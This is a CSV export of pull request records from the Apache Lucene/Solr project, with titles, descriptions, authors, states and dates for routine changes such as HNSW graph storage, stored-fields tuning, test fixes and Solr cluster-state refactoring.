"","2108","LUCENE-9626 represent HNSW graph neighbors using primitive arrays","The subject line is the main thrust, but there are a few subsidiary changes that were needed in order to achieve that (see below), and I made a few incidental improvements to HNSW-related classes.  1. Add a primitive int-valued heap, IntHeap, based on the existing PriorityQueue 2. Convert scores to 16-bit precision in order to pack them into an int along with a neighbor ordinal  The result was about a 16% improvement in indexing times, and fewer, smaller GC pauses noted in profiler.","closed","","msokolov","2020-11-30T22:05:56Z","2020-12-09T20:41:17Z"
"","2130","Adding Apache Reporter step in Release Wizard.","The release wizard doesn't currently tell the RM to add the new release to the apache release reporter.  This is a simple change to add that one step at the end of announcing the new version.","closed","","HoustonPutman","2020-12-08T03:41:46Z","2020-12-08T09:04:53Z"
"","2367","SOLR-15156: [child childFilter='...:...'] no longer escapes","The query escaping it did was inconsistent with all other places in Solr where a Lucene query may be provided.  https://issues.apache.org/jira/browse/SOLR-15156","closed","","dsmiley","2021-02-15T05:34:26Z","2021-02-17T03:37:47Z"
"","2417","Fix tests.profile output to not run many many times","The profiler should only be invoked once at the end of the build. During refactoring the buildFinished() hook became nested underneath stuff such as allProjects which causes it to run too many times.","closed","","rmuir","2021-02-23T04:48:01Z","2021-02-23T11:54:39Z"
"","1882","LUCENE-9529: Track dirtiness of stored fields via a number of docs, not chunks.","The problem of tracking dirtiness via numbers of chunks is that larger chunks make stored fields readers more likely to be considered dirty, so I'm trying to work around it by tracking numbers of docs instead.","closed","","jpountz","2020-09-17T07:25:35Z","2020-09-17T16:59:13Z"
"","2005","Add example for ConfigSet create with properties map.","The previous example in the documentation only used the less-user-friendly `configSetProp.` option.","closed","","HoustonPutman","2020-10-19T17:28:40Z","2020-10-22T15:20:39Z"
"","1932","Reuse crypto keys in reference impl","The key pair generation is expensive and instead of disabling public key handler We should just reuse a single key pair in the entire test suite.","closed","","noblepaul","2020-09-30T02:37:12Z","2020-10-09T04:09:13Z"
"","1723","SOLR prometheus: simplify concurrent collection","The intent of this is to simplify some concurrent code in the Prometheus exporter that I think is too confusing / contorted -- particularly Async.java.  Git blame points at @shalinmangar so I would love a review to see what you think.  I played with a few different approaches, and ultimately realized that we're working around using an Executor instead of an ExecutorService to benefit from invokeAll.  I wish Java didn't have a distinction between Executor & ExecutorService but there is and we should all just ignore plain Executor IMO.  I haven't run this in-the-field but I could do so locally.","closed","","dsmiley","2020-08-06T15:50:05Z","2020-08-14T19:59:40Z"
"","1888","Further tune Lucene87StoredFieldsFormat for small documents.","The increase of the maximum number of chunks per doc done in previous issues was mostly random. I'd like to provide users with a similar trade-off with what the old versions of BEST_SPEED and BEST_COMPRESSION used to do. So since BEST_SPEED used to compress at most 128 docs at once, I think we should roughly make it 128*10 now since there are 10 sub blocks. I made it 1024 to account for the fact that there is a preset dict as well that need decompressing. And similarly BEST_COMPRESSION used to allow 4x more docs than BEST_SPEED, so I made it 4096.  With such larger numbers of docs per chunk, the decoding of metadata became a bottleneck for stored field access so I made it a bit faster by doing bulk decoding of the packed longs.","closed","","jpountz","2020-09-17T13:57:42Z","2020-09-17T16:31:01Z"
"","1803","LUCENE-9456: fix DirectUpdateHandlerTest#testPrepareCommit","The following output occurred BEFORE I modified the test:  ```` 6322 INFO  (TEST-DirectUpdateHandlerTest.testPrepareCommit-seed#[BECB842E499EAF75]) [     ] o.a.s.u.DirectUpdateHandlerTest FILES before prepareCommit=[_0.cfe, _0.cfs, _0.si, _1.fdm, _1.fdt, _1_Lucene85FieldsIndex-doc_ids_2.tmp, _1_Lucene85FieldsIndexfile_pointers_3.tmp, segments_3] 6371 INFO  (TEST-DirectUpdateHandlerTest.testPrepareCommit-seed#[BECB842E499EAF75]) [     ] o.a.s.u.DirectUpdateHandlerTest FILES after prepareCommit=[_0.cfe, _0.cfs, _0.si, _1.cfe, _1.cfs, _1.si, pending_segments_4, segments_3] ````","closed","","dsmiley","2020-08-30T04:11:21Z","2020-08-30T15:32:57Z"
"","2574","LUCENE-10106: Sort optimization wrongly skip first docs","The first documents of subsequent segments are mistakenly skipped when sort optimization is enabled. We should initialize maxDocVisited in NumericComparator to -1 instead of 0.","closed","","dnhatn","2021-09-15T13:32:25Z","2021-09-15T14:16:56Z"
"","1751","Ensure DWPTPool never release any new DWPT after it's closed","The DWPTPool should not release new DPWTs after it's closed. Yet, if the pool is in a state where it's preventing new writers from being created in order to swap the delete queue it might get closed and in that case we miss to throw an AlreadyClosedException and release a new writer which violates the condition that the pool is empty after it's closed and all remaining DWPTs have been aborted.","closed","","s1monw","2020-08-14T11:26:27Z","2020-08-14T14:05:02Z"
"","2588","LUCENE-10126: Fix competitive iterator wrongly skip docs","The competitive iterator can wrongly skip a document that is advanced but not collected in the previous scoreRange.","closed","","dnhatn","2021-10-03T16:46:36Z","2021-10-03T17:10:21Z"
"","2084","LUCENE-9592: Loosen equality checks in TestVectorUtil.","TestVectorUtil occasionally fails because of floating point errors. This change slightly increases the epsilon in equality checks -- testing shows that this will greatly decrease the chance of failure.","closed","","jtibshirani","2020-11-17T01:58:00Z","2020-11-20T03:05:08Z"
"","2396","LUCENE-9774: TestDirectIODirectory fails with EINVAL on some filesystems","TestDirectIODirectory will currently fail if run on an unsupported filesystem (e.g. tmpfs). Add an ""assume"" that probes if the filesystem supports Direct I/O.  Also tweak javadocs to indicate correct @throws clauses for the IndexInput and IndexOutput. You'll get an IOException (translated from EINVAL) if the filesystem doesn't support it, not a UOE.  cc: @zacharymorn I think you helped on this Directory, if you have time to review, thank you. I know Uwe is currently busy. Mainly I want the lucene tests passing on my machine again :)","closed","","rmuir","2021-02-18T00:55:18Z","2021-02-19T01:45:57Z"
"","2645","Set cluster size to 2 and maxShardsPerNode to -1 for HttpClusterStateSSLTest","Test requires maxShardsPerNode to be -1 to allow multiple shards / replicas in a single node.","closed","","thelabdude","2022-03-09T15:35:54Z","2022-03-09T16:19:12Z"
"","2006","Add a unit test for a tessellator failure","Tessellator fails with ` java.lang.IllegalArgumentException: Unable to Tessellate shape ...` exception for the polygon in the unit test.","open","","yurikpanic","2020-10-19T18:51:12Z","2020-10-19T18:51:12Z"
"","1847","LUCENE-9514: Include TermVectorsWriter in DWPT accounting","TermVectorsWriter might consume some heap space memory that can have a significant impact on decisions made in the IW if writers should be stalled or DWPTs should be flushed if memory settings are small in IWC and flushes are frequent. This change adds RAM accounting to the TermVectorsWriter since it's part of the DWPT lifecycle and not just present during flush.","closed","","s1monw","2020-09-09T07:35:32Z","2020-09-14T18:32:07Z"
"","2353","LUCENE-9322:  Add Vectors format to CodecReader accounting methods","Take into account the new Vectors format for methods:  - ramBytesUsed - getChildResources - checkIntegrity  This has surfaced after #2331 as there are some test fails when nightly flag is true:  ``` ./gradlew :lucene:core:test --tests ""org.apache.lucene.codecs.lucene90.TestLucene90VectorFormat.testRamBytesUsed"" -Ptests.jvms=4 -Ptests.jvmargs=-XX:TieredStopAtLevel=1 -Ptests.seed=38AB1FFD5F1E45F6 -Ptests.nightly=true -Ptests.file.encoding=ISO-8859-1 ```","closed","","iverase","2021-02-11T14:03:37Z","2021-02-11T15:55:03Z"
"","1877","SOLR-13181: param macro expansion could throw","StringIndexOutOfBoundsException on bad syntax  TODO run tests etc.  https://issues.apache.org/jira/browse/SOLR-13181","closed","","dsmiley","2020-09-16T06:25:35Z","2020-09-22T19:52:39Z"
"","1839","LUCENE-9511: Include StoredFieldsWriter in DWPT accounting","StoredFieldsWriter might consume some heap space memory that can have a significant impact on decisions made in the IW if writers should be stalled or DWPTs should be flushed if memory settings are small in IWC and flushes are frequent. This change adds RAM accounting to the StoredFieldsWriter since it's part of the DWPT lifecycle and not just present during flush.","closed","","s1monw","2020-09-07T20:19:10Z","2020-09-08T16:18:19Z"
"","1752","LUCENE-9456: Move metadata about stored fields to the meta file.","Stored fields have a metadata file, but it currently only records metadata about the index, not the actual data. This commit moves all metadata to the metadata file.  Given similarities between term vectors and stored fields, this change applies the same change to term vectors.","closed","","jpountz","2020-08-14T11:28:03Z","2020-08-26T08:27:08Z"
"","1931","SOLR-14597 Advanced Query Parser (WIP)","still to do:    - move lucene classes to lucene ticket  - Investigate why TestPackages doesn't fail now (did fail, I had fixed it, but new version doesn't need my fix, so need to understand why)  - Docs!  - Package?","open","","gus-asf","2020-09-29T16:54:16Z","2020-09-29T18:19:42Z"
"","2477","SOLR-15303 Sort core dropdown on admin index page","Sorts core dropdown on admin index page by core name","closed","","costalopes71","2021-03-31T04:58:09Z","2021-03-31T05:00:04Z"
"","1909","LUCENE-9539: Remove caches from SortingCodecReader","SortingCodecReader keeps all docvalues in memory that are loaded from this reader. Yet, this reader should only be used for merging which happens sequentially. This makes caching docvalues unnecessary.","closed","","s1monw","2020-09-22T13:28:31Z","2020-09-23T12:21:29Z"
"","1959","LUCENE-9569 Disalbe sort opt on _doc","Sort optimization on _doc was introduced in PR #1856, but it looks unstable and lead to some recent tests failures. As the release of 8.7 is very soon, we need to temporarily disable the sort optimization on _doc for this release with a plan to stabilize it for later releases.","closed","","mayya-sharipova","2020-10-07T14:32:18Z","2020-10-07T15:01:54Z"
"","1817","Improve how Asserting* classes handle singleton doc values.","Some queries use DocValues.unwrapSingleton to execute different logic for single-valued doc values. When tests use AssertingCodec or AssertingLeafReader, unwrapSingleton will never unwrap the doc values, as they don't have the expected class. So some queries have code paths that are never exercised with these asserting wrappers.  This change makes sure to preserve the expected classes when creating asserting doc values.","closed","","jtibshirani","2020-09-01T23:29:21Z","2020-09-03T14:02:18Z"
"","1941","LUCENE-9554: Expose IndexWriter#pendingNumDocs","Some applications can use the pendingNumDocs from IndexWriter to estimate that the number of documents of an index is very close to the hard limit so that it can reject writes without constructing Lucene documents.","closed","","dnhatn","2020-10-02T14:40:58Z","2020-10-02T22:09:05Z"
"","1944","LUCENE-9554: Expose IndexWriter#pendingNumDocs","Some applications can use the pendingNumDocs from IndexWriter to  estimate that the number of documents of an index is very close to the hard limit so that it can reject writes without constructing Lucene documents.  Backport of #1941","closed","","dnhatn","2020-10-02T22:12:51Z","2020-10-02T22:44:56Z"
"","2634","SOLR-15501: GCSBackupRepository operations without credentials - Branch 8 11","Solution for the GCS Backup Plugin to work without configured credentials as it is the default when running solr in google cloud as mentioned in https://issues.apache.org/jira/browse/SOLR-15501","closed","","linuxswords","2021-12-21T09:22:32Z","2022-01-13T18:30:14Z"
"","2285","SOLR-14928: introduce distributed cluster state updates","SOLR-14928: introduce distributed cluster state updates (i.e. not having to go through a ZK queue and Overseer)  The motivation behind this PR is to simplify SolrCloud and be the first step to (eventually) a significant scale increase: handle orders of magnitude more collections than currently and manage cluster state caching in a more flexible way.  Changes introduced by this PR:  - Support of distributed state updates for collections through Compare and Swap for updating state.json Zookeeper files. - Cluster wide configuration in `solr.xml` to pick the way cluster state updates are handled (default remains Overseer based updates) - Randomization based on test seed of the cluster update strategy (Distributed vs Overseer) in tests using `MiniSolrCloudCluster`, so both execution paths get continuously tested.  A good entry point to explore this PR is class `DistributedClusterChangeUpdater`.  Performance wise, small (low replica count) collection creation is faster with the distributed strategy than with Overseer, and significantly faster when multiple collections are created in parallel (10 parallel threads continuously creating 4 replicas collections show a 30% reduction in collection creation time on my laptop). High replica count (~40 and more) collection creation is slower. This will be addressed by using Per Replica States that limit contention on access to a single state.json file and/or a future splitting of state.json into finer grain elements.  Next step after this one is distributing the execution of the Collection API commands to all nodes.","closed","","murblanc","2021-02-01T17:38:20Z","2021-02-21T18:10:00Z"
"","2364","SOLR-14928: allow cluster state updates to be done in a distributed way","SOLR-14928: allow cluster state updates to be done in a distributed way and not through Overseer","closed","","murblanc","2021-02-13T01:08:29Z","2021-02-21T18:09:50Z"
"","1684","SOLR-14613: strongly typed placement plugin interface and implementation","SOLR-14613: strongly typed initial proposal for plugin interface to replace Autoscaling  This is not meant to be merged, it's to share early for feedback. Still WIP, any feedback most welcome before I invest more time.","closed","autoscaling,","murblanc","2020-07-20T22:12:19Z","2020-09-16T22:38:25Z"
"","2149","Add two solr/CHANGES.txt entries for SOLR-14981 and SOLR-15046.","So that 8.8.0 sections match on master and branch_8x branches.","closed","","cpoerschke","2020-12-16T18:27:50Z","2020-12-17T12:40:09Z"
"","2045","SOLR-14968","Small JavaDoc improvement.","closed","","epugh","2020-10-29T16:12:17Z","2020-10-29T16:38:42Z"
"","2339","LUCENE-9705: Reset internal version in Lucene90FieldInfosFormat.","Since this is a fresh format, we can remove older version logic and reset the internal version to 0.","closed","","jtibshirani","2021-02-10T01:54:27Z","2021-02-11T17:11:51Z"
"","2514","Fix some psuedo->pseudo typos in Solr Ref Guide.","Since `solr/main` no longer has the equivalent typos this pull request is for `lucene-solr/branch_8x` only.","closed","","cpoerschke","2021-06-22T15:55:49Z","2021-07-22T16:28:05Z"
"","2041","Graduate the release wizard from ALPHA","Simply remove ALPHA wording and the recommendation to double check with old WIKI TODO","closed","","janhoy","2020-10-28T08:53:05Z","2020-10-29T10:28:07Z"
"","1792","LUCENE-9485: Check early if Solr port 8983 is available","Simple port check before tests start See https://issues.apache.org/jira/browse/LUCENE-9485","closed","","janhoy","2020-08-27T14:18:04Z","2020-08-28T08:08:41Z"
"","1750","LUCENE-9463: Query match region retrieval component, passage scoring and formatting","Separated components from previous PR. Already reviewed by @romseygeek","closed","","dweiss","2020-08-14T10:45:23Z","2020-08-14T12:21:13Z"
"","1727","SOLR-14582 - Broken test needs fix","Seems this is likely just an oversight in testing, not a real problem, so Adding AwaitsFix to allow builds to stop failing.","closed","","gus-asf","2020-08-07T22:23:02Z","2020-08-07T22:49:04Z"
"","2384","SOLR-15135: Use DocCollection to generate state.json format expected by UI to work with perReplicaState collections (backport to 8x)","see: https://github.com/apache/lucene-solr/pull/2383","closed","","thelabdude","2021-02-16T21:19:15Z","2021-02-16T21:27:14Z"
"","2182","SOLR-15058: Fix auto-scaling test fails missed in previous PR","See: https://github.com/apache/lucene-solr/pull/2180 ... missed some test failures","closed","","thelabdude","2021-01-06T00:31:15Z","2021-01-06T00:32:02Z"
"","2554","SOLR-15089: Allow backup/restoration to Amazon's S3 blobstore","See solr/contrib/s3-repository/README.md for more information.  Co-authored-by: Andy Throgmorton  Co-authored-by: Pierre Salagnac  Co-authored-by: Houston Putman","closed","","HoustonPutman","2021-08-17T21:43:37Z","2021-08-18T15:05:35Z"
"","1831","SOLR-14749 the scheduler part","See PR 1758 for the background on this.","open","","sigram","2020-09-04T11:50:43Z","2020-09-09T16:47:03Z"
"","2101","SOLR-15016 Replica placement plugins should use container plugins API / configs","See Jira for more details.","closed","","sigram","2020-11-27T09:38:22Z","2020-12-09T17:32:52Z"
"","2199","SOLR-15055 (Take 2) Re-implement 'withCollection'","See Jira for details.  This is a minimal approach that helps to set-up the initial co-location and then may veto collection layout changes (additions / removals or replicas) if it would violate the `withCollection` constraint.  This PR also refactors the placement API to add support for other types of ""collection modification"" requests, and extends the placement plugin API to add a method for vetoing such changes. `DeleteReplicaCmd` is also modified to make use of this functionality.","closed","","sigram","2021-01-13T11:51:31Z","2021-01-26T15:05:36Z"
"","2453","SOLR-15210: ParallelStream should execute hashing & filtering directly in ExportWriter","See Jira for details.","open","","sigram","2021-03-04T17:45:20Z","2021-03-08T14:22:59Z"
"","2344","SOLR-15131: Use collection properties instead of plugin configurations for per-collection placement plugin configs.","See Jira for details.","closed","","sigram","2021-02-10T14:50:24Z","2021-02-25T09:56:09Z"
"","2179","SOLR-15055 Re-implement 'withCollection' and 'maxShardsPerNode'","See Jira for details.","closed","","sigram","2021-01-05T19:47:28Z","2021-02-25T09:57:39Z"
"","2133","SOLR-15019: Replica placement API needs a way to fetch existing replica metrics","See JIRA for details.","closed","","sigram","2020-12-09T15:17:08Z","2021-02-18T18:30:17Z"
"","1758","SOLR-14749: Provide a clean API for cluster-level event processing,  Initial draft.","See JIRA for details.","closed","clean-api,","sigram","2020-08-17T17:35:22Z","2020-10-19T14:24:17Z"
"","1696","SOLR-14608 Faster sorting for the /export handler","See Jira for details.","open","","sigram","2020-07-27T13:44:23Z","2021-01-07T16:05:22Z"
"","1678","SOLR-14613: Initial POC based on Ilan's proposal.","See Jira for background.  This PR is based on Ilan's proposal for a minimal API that is totally independent of Solr internals. I renamed some of the interfaces for convenience, and implemented a few concrete classes (POJOs) to pass data around.  So far I implemented a round-trip shim between SolrCloudManager and AssignerClusterState and its components - see TestPolicy8x for details. This is sufficient to support the Policy engine calculations using the new API + shim.   I didn't start converting the Solr side of things to actually provide the new APIs to the Assigner implementations, and I didn't hook up the creation of Assigner yet.","closed","","sigram","2020-07-16T15:50:11Z","2020-10-19T14:25:15Z"
"","2469","LUCENE-9836: Fix 8.x Maven Validation and publication to work with Maven Central and HTTPS again; remove pure Maven build (did not work anymore)","See issue: https://issues.apache.org/jira/browse/LUCENE-9836","closed","","uschindler","2021-03-13T11:54:52Z","2021-03-16T16:07:36Z"
"","1780","LUCENE-9479: Forbiddenapis & Gradle: Add commons-io bundled signatures","See issue https://issues.apache.org/jira/browse/LUCENE-9479","closed","","uschindler","2020-08-24T23:09:28Z","2020-08-25T07:05:30Z"
"","2502","SOLR-15316 Update Jetty to 9.4.41 (backport 8x)","See https://issues.apache.org/jira/browse/SOLR-15316  This is a backport of SOLR-15316 with mostly ivy changes. But in this 8x branch, the upgrade also affects lucene-replicator module. So I filed LUCENE-9985 to make sure lucene 9 (main) does not downgrade jetty again for that module :) Therefore I also added the LUCENE-9985 changes entry to this PR, since Lucene 8.9 is the first that has jetty 9.4.41 for the replicator...","closed","","janhoy","2021-06-02T07:47:12Z","2021-06-04T07:39:19Z"
"","2464","SOLR-15163 Update DOAP file for solr TLP","See https://issues.apache.org/jira/browse/SOLR-15163 for background.  The DOAP file is used to generate projects.apache.org, so updating it will fix that directory. See https://projects.apache.org/about.html","closed","","janhoy","2021-03-08T08:34:50Z","2021-03-08T14:48:19Z"
"","2046","SOLR-14972: Change default port of prometheus exporter to 8989","See https://issues.apache.org/jira/browse/SOLR-14972","closed","","janhoy","2020-10-29T21:17:37Z","2020-11-02T13:06:39Z"
"","1986","SOLR-14936: Fixed Grafana dashboard filters","See https://issues.apache.org/jira/browse/SOLR-14936","closed","","janhoy","2020-10-15T15:06:14Z","2020-10-19T12:49:08Z"
"","1747","SOLR-14751: Zookeeper Admin screen not working for old ZK versions","See https://issues.apache.org/jira/browse/SOLR-14751  Solution is to treat `NoNodeException` not as an unrecoverable exception, but as expected for older ZK versions and return empty string.  A workaround for 8.6.x is to do a      bin/solr zkroot /zookeeper/config  Then the Admin UI in 8.6 will start working with old ZK.","closed","","janhoy","2020-08-13T12:34:43Z","2020-08-13T23:32:35Z"
"","1701","SOLR-14671: Parsing dynamic ZK config sometimes cause NuberFormatException","See https://issues.apache.org/jira/browse/SOLR-14671","closed","","janhoy","2020-07-27T23:50:54Z","2020-07-29T08:37:16Z"
"","2480","LUCENE-9912 Disable HTML doclint in Lucene/Solr 8","See https://issues.apache.org/jira/browse/LUCENE-9912","closed","","uschindler","2021-04-07T11:54:57Z","2021-04-07T12:46:49Z"
"","2446","LUCENE-9820: Separate logic for reading the BKD index from logic to intersecting it","See https://issues.apache.org/jira/browse/LUCENE-9820  This PR introduces a `BKDIndexInput` abstraction that encapsulates all the methods that we need to read the KD index. It introduces a LeafIterator as well, which is something we were using already when merging 1 dimensional points, but it is formalise now.","closed","","iverase","2021-03-03T14:17:37Z","2021-03-10T15:09:49Z"
"","2377","LUCENE-9777: Fix out of date versions on releases 8.7.0 and 8.8.0","See https://issues.apache.org/jira/browse/LUCENE-9777.  This seems to bring this part of the release process up-to-date.","closed","","iverase","2021-02-16T14:01:18Z","2021-02-17T07:29:09Z"
"","2268","LUCENE-9705: Move Lucene50CompoundFormat to Lucene90CompoundFormat","see https://issues.apache.org/jira/browse/LUCENE-9705","closed","","iverase","2021-01-29T09:43:22Z","2021-02-09T08:19:11Z"
"","2062","LUCENE-9589 Swedish minimal stemmer","See https://issues.apache.org/jira/browse/LUCENE-9589  This impl is based on [SwedishLightStemmer](https://github.com/apache/lucene-solr/blob/master/lucene/analysis/common/src/java/org/apache/lucene/analysis/sv/SwedishLightStemmer.java), concentrating on the plural endings only, inspired by [NorwegianMinimalStemmer](https://github.com/apache/lucene-solr/blob/master/lucene/analysis/common/src/java/org/apache/lucene/analysis/no/NorwegianMinimalStemmer.java).  Some of the examples tested in `minimal.txt` are fetched from https://en.wikipedia.org/wiki/Swedish_grammar, not any scientific rule book of any kind.","closed","","janhoy","2020-11-04T13:20:37Z","2021-05-28T12:19:31Z"
"","1946","LUCENE-9558: Clean up package name conflicts for analyzers-icu.","See https://issues.apache.org/jira/browse/LUCENE-9558  - move classes under ""o.a.l.collation"" to ""o.a.l.a.icu"" - classes under ""o.a.l.collation.tokenattributes"" to ""o.a.l.a.icu.tokenattributes"" - delete ""o.a.l.collation"" from analyzers-icu","closed","","mocobeta","2020-10-04T12:11:37Z","2020-10-05T08:52:30Z"
"","1866","LUCENE-9523: Speed up query shapes for geometries that generate multiple points","see https://issues.apache.org/jira/browse/LUCENE-9523.  This PR adds a check to determine if the relationship between a doc and the query shape is already known, so that it can skip an expensive relate method.  In addition it adds a dense intersect visitor that it is used when the number of points > 4* number of docs so we can use the same strategy for intersects queries.  Performance test shows a great increase in QPS in most cases:  ``` |point|intersects|0.00|0.00|-2%|321.21|326.21|-2%|2644|2644| 0%| |box|intersects|6.45|5.74|12%|43.87|39.04|12%|33081264|33081264| 0%| |distance|intersects|6.42|5.22|23%|22.53|18.35|23%|64062400|64062400| 0%| |poly 10|intersects|5.44|4.44|23%|20.71|16.90|23%|59064569|59064569| 0%| |polyMedium|intersects|0.44|0.34|29%|27.29|21.24|29%|528812|528812| 0%| |polyRussia|intersects|1.86|1.09|70%|7.59|4.46|70%|244848|244848| 0%| |point|contains|0.00|0.00| 1%|297.94|295.05| 1%|2644|2644| 0%| |box|contains|0.00|0.00|10%|39.92|36.37|10%|484|484| 0%| |distance|contains|0.00|0.00|18%|22.93|19.51|18%|406|406| 0%| |poly 10|contains|0.00|0.00|17%|19.63|16.79|17%|402|402| 0%| |polyMedium|contains|0.00|0.00|19%|19.42|16.38|19%|147|147| 0%| |point|within|0.00|0.00| 0%|362.16|362.01| 0%|0|0| 0%| |box|within|0.58|0.54| 6%|3.94|3.72| 6%|32911251|32911251| 0%| |distance|within|1.00|1.02|-2%|3.52|3.61|-2%|63868270|63868270| 0%| |poly 10|within|0.95|0.92| 3%|3.62|3.51| 3%|58873224|58873224| 0%| |polyMedium|within|0.05|0.05| 4%|3.37|3.25| 4%|522739|522739| 0%| |polyRussia|within|0.75|0.69| 9%|3.07|2.82| 9%|244661|244661| 0%| |point|disjoint|264.37|263.24| 0%|20.08|19.99| 0%|2962178156|2962178156| 0%| |box|disjoint|185.65|181.04| 3%|14.26|13.91| 3%|2929099536|2929099536| 0%| |distance|disjoint|143.19|130.91| 9%|11.12|10.16| 9%|2898118400|2898118400| 0%| |poly 10|disjoint|138.35|123.17|12%|10.72|9.55|12%|2903116231|2903116231| 0%| |polyMedium|disjoint|159.57|141.88|12%|12.14|10.79|12%|433924372|433924372| 0%| |polyRussia|disjoint|80.56|52.82|53%|6.23|4.09|53%|12920400|12920400| 0%| ```","closed","","iverase","2020-09-14T07:42:38Z","2020-09-18T05:50:59Z"
"","1849","LUCENE-9517: Add doPrivileged block when creating BugfixDeflater_JDK8252739 objects","see https://issues.apache.org/jira/browse/LUCENE-9517","closed","","iverase","2020-09-09T11:33:34Z","2020-09-10T09:12:20Z"
"","1697","LUCENE-9292: BKDWriter refactor: Group point configuration in its own class","see https://issues.apache.org/jira/browse/LUCENE-9292  This changes introduces a new class called BKDConfig which contains the point configuration. It just makes things a bit more tidy and it encapsulates all the bytes calculations for number of dimension and bytes per dimension.   Relates #1376","closed","","iverase","2020-07-27T16:43:13Z","2020-09-08T08:24:59Z"
"","2449","SOLR-15045: Execute local leader commit in parallel with distributed commits in DistributedZkUpdateProcessor","See also: [SOLR-15045](https://issues.apache.org/jira/browse/SOLR-15045)","open","","magibney","2021-03-03T21:49:14Z","2021-03-04T19:21:57Z"
"","2143","LUCENE-9021 QueryParser: re-use the LookaheadSuccess exception for branch_8x","Same as https://github.com/apache/lucene-solr/pull/962, for branch 8.x  This is basically the same as https://issues.apache.org/jira/browse/SOLR-11242 , but for Lucene QueryParser  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I am authorized to contribute this code to the ASF and have removed any code I do not have a license to distribute. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","pbruski","2020-12-14T16:48:55Z","2020-12-15T05:56:22Z"
"","2462","SOLR-14759 fix tests that need on lucene test-src","Rewrite one, ignore the other two.","closed","","madrob","2021-03-05T19:56:30Z","2021-03-08T13:56:01Z"
"","2011","Solr 14954: Heavily edit reindexing.adoc","Reviewed and incorporated comments, I think it's ready.","closed","","ErickErickson","2020-10-20T23:41:27Z","2020-10-25T16:00:39Z"
"","2186","LUCENE-9334 Consistency of field data structures","Require consistency between data-structures on a per-field basis  A field must be indexed with the same index options and data-structures across all documents within a segment. Thus, for example, it is not allowed to have one document in a segment where a certain field is indexed with doc values and points, and another document where the same field is indexed only with points. But it is allowed for a document not to have a certain field at all.  This requirement is ensured only per segment basis, thus it is possible to have a index where two segments have different data structures for the same field.  This patch also corrects tests where fields were indexed inconsistently with different data structures across documents: - Remove TestDocValuesIndexing::testDocsWithField, as it doesn't test anything special, what it was originally created to test","closed","","mayya-sharipova","2021-01-07T23:03:45Z","2021-03-16T22:00:09Z"
"","2147","LUCENE-9637: Clean up ShapeField/ShapeQuery random test","Removes some unused code and replaces the Point implementation on the test with the Point implementation in the geo package.  cc: @nknize","closed","","iverase","2020-12-15T10:11:09Z","2020-12-16T11:12:59Z"
"","2033","Fix changes entry in 8x branch","Remove the entries which are master(9x) only","closed","","munendrasn","2020-10-26T13:16:43Z","2020-10-27T08:57:47Z"
"","2156","Clean up IDEA config generation","Remove references to clustering contrib, catch up ivy version, remove obsolete references to spatial contrib.","closed","","madrob","2020-12-17T20:18:45Z","2020-12-18T06:55:52Z"
"","2371","LUCENE-9322: Lucene90VectorReader can leak open files","Related to #2331, this time change the logic when creating a `Lucene90VectorReader` so it closes properly files on error.","closed","","iverase","2021-02-15T14:53:31Z","2021-02-16T14:08:53Z"
"","2109","LUCENE-9627: Small refactor of codec classes","Refactor of codec classes to separate reading header/footer from reading content of the file.  In addition the `Lucene50FieldInfosFormat` class is removed as it is not used in the codebase.","closed","","iverase","2020-12-01T07:39:18Z","2020-12-15T09:13:29Z"
"","2035","SOLR-14844: Upgrade Jetty to 9.4.32.v20200930","Ready at last I think.","closed","","ErickErickson","2020-10-26T17:14:10Z","2020-10-30T01:03:33Z"
"","2036","SOLR-14844: Upgrade Jetty to 9.4.32.v20200930","Ready at last","closed","","ErickErickson","2020-10-26T17:14:40Z","2020-10-30T01:03:35Z"
"","2383","SOLR-15135: Use DocCollection to generate state.json format expected by UI to work with perReplicaState collections.","Quick fix to render collections with `perReplicaState=true` by using DocCollection instead of reading ZK data directly.  Btw ... there is no unit test for the `ZookeeperInfoHandler` so testing for this fix was manual. Created 12 collections 6 with perReplicaState=true and 6 with perReplicaState=false and exercised the graph panel in the cloud UI. See SOLR-15098 where a unit test should be created when refactoring `ZookeeperInfoHandler`","closed","","thelabdude","2021-02-16T21:10:08Z","2021-02-16T22:01:36Z"
"","2540","LUCENE-10027  provide leaf sorter from commit","Provide leaf sorter for directory readers opened from IndexCommit  LUCENE-9507 allowed to provide a leaf sorter for directory readers. One API that was missed is to allow to provide a leaf sorter for directory readers opened from an index commit. This patch adds this API.","closed","","mayya-sharipova","2021-07-30T17:34:49Z","2021-07-30T17:36:56Z"
"","2125","SOLR-8673: Enable custom aggregate functions by opening up FacetContext","Prior to this change, it was not feasible to write a custom aggregate function in plugin code because the FacetContext class did not expose its fields for access outside its package. Also some of the useful abstract classes for SlotAcc were package-private too   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","mkhludnev","2020-12-07T10:34:53Z","2020-12-07T10:51:08Z"
"","1709","LUCENE-9446: In boolean rewrite, remove MatchAllDocsQuery filter clauses","Previously, we only removed 'match all' FILTER clauses if there was at least one MUST clause. Now they're also removed if there is another distinct FILTER clause.  This lets boolean queries like `#field:value #*:*` be written to `#field:value`.","closed","","jtibshirani","2020-07-31T23:07:44Z","2020-08-04T15:16:15Z"
